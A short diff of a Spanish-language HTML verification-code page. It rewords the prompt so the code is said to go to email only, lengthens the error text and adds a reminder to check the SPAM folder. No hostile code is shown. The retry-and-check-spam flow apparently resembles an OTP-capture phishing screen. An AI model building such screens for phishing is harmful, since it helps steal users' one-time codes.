@@ -82,13 +82,14 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su celular o correo electronico.</h3>
-    <p>Introduce el codigo de verificacion que te acabamos de enviar a su celular de confianza o correo electronico.</p>
+    <h3>Te enviaremos el codigo SMS a su correo electronico.</h3>
+    <p>Introduce el codigo de verificacion que te acabamos de enviar a su correo electronico.</p>
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
       <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
     </div>
-    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
+    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente que fue enviado a su correo electronico.</p>
+    <h6>Recuerde revisar su bandeja de <strong>SPAM</strong> su codigo pudo haber llegado ahi.</h6>
     <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
